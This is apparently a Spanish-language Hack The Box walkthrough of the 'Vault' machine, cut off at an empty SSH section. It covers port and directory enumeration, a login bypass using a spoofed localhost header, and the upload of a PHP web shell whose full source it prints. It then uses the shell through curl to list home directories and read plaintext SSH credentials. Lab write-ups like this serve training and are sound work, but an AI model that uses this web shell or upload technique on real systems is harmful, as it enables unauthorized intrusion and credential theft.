---
title: "Hack The Box - Vault"
excerpt: "<img src='/images/portfolio/vault/cover.webp' width='500' height=auto><br/><br/>Vault is medium to hard difficulty machine, which requires bypassing host and file upload restrictions, tunneling, creating malicious OpenVPN configuration files and PGP decryption."
collection: portfolio
---

NMAP
------

Utilizo la herramienta nmap para escaneo de puertos y servicios.<br/>

    ┌──(root㉿kali)-[/home/nico/htb/vault]
    └─# nmap -p- --min-rate 1000 -A 10.10.10.109 
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-25 11:01 CET
    Nmap scan report for 10.10.10.109
    Host is up (0.095s latency).
    Not shown: 65533 closed tcp ports (reset)
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 a6:9d:0f:7d:73:75:bb:a8:94:0a:b7:e3:fe:1f:24:f4 (RSA)
    |   256 2c:7c:34:eb:3a:eb:04:03:ac:48:28:54:09:74:3d:27 (ECDSA)
    |_  256 98:42:5f:ad:87:22:92:6d:72:e6:66:6c:82:c1:09:83 (ED25519)
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
    TCP/IP fingerprint:
    OS:SCAN(V=7.94SVN%E=4%D=1/25%OT=22%CT=1%CU=31251%PV=Y%DS=2%DC=T%G=Y%TM=65B2
    OS:31EF%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=I%TS=A)SEQ(S
    OS:P=106%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI
    OS:=RD%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CS
    OS:T11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5
    OS:=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%
    OS:T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
    OS:R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T
    OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
    OS:0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(
    OS:R=Y%DFI=N%T=40%CD=S)

    Network Distance: 2 hops
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    TRACEROUTE (using port 80/tcp)
    HOP RTT       ADDRESS
    1   194.95 ms 10.10.14.1
    2   195.11 ms 10.10.10.109

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 105.80 seconds

HTTP
------

Si accedo mediante el navegador a la dirección IP obtengo lo siguiente.<br/>

<img src='/images/portfolio/vault/http.png' width='900' height=auto><br/><br/>

Como siempre, voy a tratar de encontrar alguna dirección interesante a través de 'gobuster'.<br/>

    ┌──(root㉿kali)-[/home/nico/htb/vault]
    └─# gobuster dir --url http://10.10.10.109/ --wordlist /usr/share/wordlists/dirb/common.txt
    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.10.10.109/
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /.hta                 (Status: 403) [Size: 291]
    /.htpasswd            (Status: 403) [Size: 296]
    /.htaccess            (Status: 403) [Size: 296]
    /index.php            (Status: 200) [Size: 299]
    /server-status        (Status: 403) [Size: 300]
    Progress: 4614 / 4615 (99.98%)
    ===============================================================
    Finished
    ===============================================================

Como puede verse, no obtengo nada que me interese. Volviendo a la respuesta del 'index.php' me dice que están construyendo un nuevo cliente llamado 'Sparklays'. Voy a probar a acceder a la ruta /sparklays a ver si existe.<br/>

<img src='/images/portfolio/vault/sparklays.png' width='900' height=auto><br/><br/>

Resulta que el directorio existe aunque no tengo el acceso permitido. Voy a enumerar los directorios a ver si saco algo.<br/>

    ┌──(root㉿kali)-[/home/nico/htb/vault]
    └─# gobuster dir --url http://10.10.10.109/sparklays --wordlist /usr/share/wordlists/dirb/common.txt 
    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.10.10.109/sparklays
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /.htaccess            (Status: 403) [Size: 306]
    /.hta                 (Status: 403) [Size: 301]
    /.htpasswd            (Status: 403) [Size: 306]
    /admin.php            (Status: 200) [Size: 615]
    /design               (Status: 301) [Size: 323] [--> http://10.10.10.109/sparklays/design/]
    Progress: 4614 / 4615 (99.98%)
    ===============================================================
    Finished
    ===============================================================

Parece que tengo algo por donde tirar, una página '/admin.php' y un directorio llamado '/design'. Voy a acceder a la página del admin a ver que me encuentro. <br/>

<img src='/images/portfolio/vault/adminLogin.png' width='900' height=auto><br/><br/>

Resulta ser una interfaz de autenticación, si pruebo con las típicas credenciales no consigo acceder. Voy a probar un método con ayuda de Burpsuite, para que al enviar la petición de 'admin.php', el servidor se piense que se está haciendo desde el localhost a ver si así consigo acceder.<br/>

<img src='/images/portfolio/vault/localhost.png' width='900' height=auto><br/><br/>

Una vez que envío la petición con esa modificación, consigo hacer el bypass del login y me encuentro la siguiente interfaz.<br/>

<img src='/images/portfolio/vault/bypass.png' width='900' height=auto><br/><br/>

Navegando un poco consigo encontrar algo muy interesante. Realizando los pasos Design Settings > Change Logo me encuentro con lo siguiente.<br/>

<img src='/images/portfolio/vault/upload.png' width='900' height=auto><br/><br/>

Resulta que puedo subir archivos al servidor mediante esta interfaz. Esto ya sabemos que es sinónimo de reverse shell. Voy a buscar un script que me sirva para este escenario y procederé a subirlo.<br/><br/>

Una vez que subo el shell, tengo que encontrar la forma de ejecutarlo a través de la ruta en la que se encuentra. Voy a realizar una enumeración de directorios en la ruta '/sparklays/design/' a ver si hay suerte.<br/>

    ┌──(root㉿kali)-[/home/nico/htb/vault]
    └─# gobuster dir --url http://10.10.10.109/sparklays/design/ --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.10.10.109/sparklays/design/
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /.hta                 (Status: 403) [Size: 308]
    /.htaccess            (Status: 403) [Size: 313]
    /.htpasswd            (Status: 403) [Size: 313]
    /uploads              (Status: 301) [Size: 331] [--> http://10.10.10.109/sparklays/design/uploads/]
    Progress: 4723 / 4724 (99.98%)
    ===============================================================
    Finished
    ===============================================================

Resulta que existe un directorio llamado 'uploads' dentro de design. El shell que subí es uno que ya trae Kali Linux y el código es el siguiente.<br/>

    ┌──(root㉿kali)-[/home/nico/htb/vault]
    └─# cp /usr/share/webshells/php/simple-backdoor.php .     
                                                                                                                                                                
    ┌──(root㉿kali)-[/home/nico/htb/vault]
    └─# mv simple-backdoor.php shell.php5                                                      
                                                                                                                                                                
    ┌──(root㉿kali)-[/home/nico/htb/vault]
    └─# cat shell.php5                                   
    <!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

    <?php

    if(isset($_REQUEST['cmd'])){
            echo "<pre>";
            $cmd = ($_REQUEST['cmd']);
            system($cmd);
            echo "</pre>";
            die;
    }

    ?>

    Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

    <!--    http://michaeldaw.org   2006    -->

En la penúltima línea me explica la forma de utilizarlo, voy a probar a ver si funciona.<br/>

<img src='/images/portfolio/vault/testShell.png' width='900' height=auto><br/><br/>

Funciona perfectamente así que voy a realizar una serie de peticiones por terminal a ver si consigo algo interesante.<br/>

    ┌──(root㉿kali)-[/home/nico/htb/vault]
    └─# curl -X GET http://10.10.10.109/sparklays/design/uploads/shell.php5?cmd=ls+-lah+/home
    <!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

    <pre>total 16K
    drwxr-xr-x  4 root root 4.0K Jun  2  2021 .
    drwxr-xr-x 24 root root 4.0K Dec  2  2021 ..
    drwxr-xr-x 19 alex alex 4.0K Jun  2  2021 alex
    drwxr-xr-x 18 dave dave 4.0K Jun  2  2021 dave
    </pre>

<br/>

    ┌──(root㉿kali)-[/home/nico/htb/vault]
    └─# curl -X GET http://10.10.10.109/sparklays/design/uploads/shell.php5?cmd=ls+-lah+/home/dave/Desktop
    <!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

    <pre>total 20K
    drwxr-xr-x  2 dave dave 4.0K Jun  2  2021 .
    drwxr-xr-x 18 dave dave 4.0K Jun  2  2021 ..
    -rw-rw-r--  1 alex alex   74 Jul 17  2018 Servers
    -rw-rw-r--  1 alex alex   14 Jul 17  2018 key
    -rw-rw-r--  1 alex alex   20 Jul 17  2018 ssh
    </pre>

<br/>

    ┌──(root㉿kali)-[/home/nico/htb/vault]
    └─# curl -X GET http://10.10.10.109/sparklays/design/uploads/shell.php5?cmd=cat+/home/dave/Desktop/ssh
    <!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

    <pre>dave
    Dav3therav3123
    </pre>

Parece que he conseguido unas credenciales para acceder al servidor mediante SSH.<br/>

SSH
------

